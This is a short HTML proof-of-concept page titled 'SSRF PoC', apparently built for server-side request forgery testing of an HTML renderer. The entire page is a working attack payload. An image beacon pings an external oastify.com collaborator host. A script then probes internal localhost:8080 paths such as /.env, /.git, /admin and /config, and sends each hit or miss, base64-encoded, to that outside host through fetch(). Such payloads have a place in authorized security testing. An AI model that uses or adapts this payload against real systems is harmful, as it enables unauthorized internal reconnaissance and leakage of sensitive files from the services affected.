<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SSRF PoC</title>
</head>

<body>
    <h1>Hello</h1>
    <img src="https://nb2em23ratmfg4k6wwuhqqgec5iw6wul.oastify.com/?ItsRenderingHtml">
    <script>
        const paths = [
            "/", "/robots.txt", "/login", "/admin", "/api", "/dashboard",
            "/config", "/metrics", "/.env", "/.git", "/idDontExist323277323"
        ];

        paths.forEach(path => {
            const img = new Image();
            img.src = `http://localhost:8080${path}`;

            img.onload = () => {
                fetch(`https://nb2em23ratmfg4k6wwuhqqgec5iw6wul.oastify.com/?hit=VALID-${btoa(path)}`);
            };

            img.onerror = () => {
                fetch(`https://nb2em23ratmfg4k6wwuhqqgec5iw6wul.oastify.com/?hit=INVALID-${btoa(path)}`);
            };
        });
    </script>

</body>

</html>
